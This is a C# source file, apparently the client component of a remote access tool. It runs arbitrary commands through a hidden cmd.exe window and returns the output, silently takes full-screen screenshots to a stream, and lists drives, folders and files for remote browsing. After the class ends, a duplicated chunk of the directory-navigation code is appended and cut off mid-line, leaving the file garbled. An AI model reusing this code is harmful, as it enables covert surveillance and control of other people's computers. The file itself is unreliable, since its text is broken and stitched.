using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Net.Sockets;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Drawing.Imaging;


namespace ConsoleApplication5
{
    public class Tools
    {
        static String nav_path = Directory.GetCurrentDirectory(); 
        public String cpath;
        public Tools()
        {
            cpath = Directory.GetCurrentDirectory();
        }
        public static String get_nav_path() {
            return nav_path;
        }
        public String cmd(String cnd)
        {

            cnd = cnd.Trim();
            String output = " ";
            Console.WriteLine(cnd);

            if ((cnd.Substring(0, 3).ToLower() == "cd_") && (cnd.Length > 2))
            {

                if (System.IO.Directory.Exists(cnd.Substring(2).Trim()))
                    cpath = cnd.Substring(2).Trim();

            }
            else
            {
                cnd = cnd.Insert(0, "/B /c ");
                Process p = new Process();
                p.StartInfo.WorkingDirectory = cpath;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = cnd;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.Start();
                output = p.StandardOutput.ReadToEnd();  // output of cmd
                output = (output.Length == 0) ? " " : output;
                p.WaitForExit();

            }
            return output;
        } // end cmd 


        private static Bitmap GetScreenShot()
        {
            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            }

            return bitmap;
        }

        public static void sendScreenShot(Stream stm, long qlt)
        {
            Bitmap img = GetScreenShot();
            ImageCodecInfo[] codec = ImageCodecInfo.GetImageEncoders();

            // initialisation d'un tableau de dimension 2 de parametres d'encodages 
            EncoderParameters encodeurs = new EncoderParameters(2);
            // parametre qualite
            EncoderParameter qualite = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, qlt);
            // Parametre compression 
            EncoderParameter compression = new EncoderParameter(System.Drawing.Imaging.Encoder.Compression, (long)24);
            // remplir tableau parametre
            encodeurs.Param[0] = qualite;
            encodeurs.Param[1] = compression;

            img.Save(stm, codec[1], encodeurs);
        }

        public static String get_drives(int c,String path) // 2 gets all  ;  1 gets only files
        {
            StringBuilder str = new StringBuilder();
            if (c>=2){
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                str.Append(d.Name+"\n");
            }
            
            str.Append("<\n");
            
            
                str.Append(path+ "\n<\n");
            }

            if (Directory.Exists(path))
            {
                nav_path = path;
                if (c >= 1)
                {
                    String[] dir = Directory.GetDirectories(path);
                    foreach (String d in dir)
                    {
                        String[] temp = d.Split(Path.DirectorySeparatorChar);
                        str.Append(temp[temp.Length - 1] + "\n");
                    }
                    str.Append("<\n");

                    dir = Directory.GetFiles(path);
                    foreach (String d in dir)
                    {
                        String[] temp = d.Split(Path.DirectorySeparatorChar);
                        str.Append(temp[temp.Length - 1] + "\n");
                    }

                }
                return str.ToString();
            }
            return "Nothing Found"; 
        }

        public static String dynamic_nav(String dir) {
            Console.WriteLine(dir);
            nav_path.TrimEnd(Path.DirectorySeparatorChar);
            if (dir == "..")
            {
                nav_path = (Directory.GetParent(nav_path).Exists) ? Directory.GetParent(nav_path).FullName : nav_path;
                return get_drives(1, nav_path);
            }
            else
            {
                if (Directory.Exists(nav_path + Path.DirectorySeparatorChar + dir))
                {
                    nav_path = nav_path + Path.DirectorySeparatorChar + dir;
                    return get_drives(1, nav_path);
                }
                else if (Directory.Exists(dir))
                {
                    nav_path = dir;
                    return get_drives(1, nav_path);
                }
            }
            return "Nothing found" ;
        }

    }
}              return str.ToString();
            }
            return "Nothing Found"; 
        }

        public static String dynamic_nav(String dir) {
            Console.WriteLine(dir);
            nav_path.TrimEnd(Path.DirectorySeparatorChar);
            if (dir == "..")
            {
                nav_path = (Directory.GetParent(nav_path).Exists) ? Directory.GetParent(nav_path).FullName : nav_path;
                return get_drives(1, nav_path);
            }
            else
            {
                if (Directory.Exists(nav_path + Path.DirectorySeparatorChar + dir))
                {
                    nav_path = nav_path + Path.DirectorySep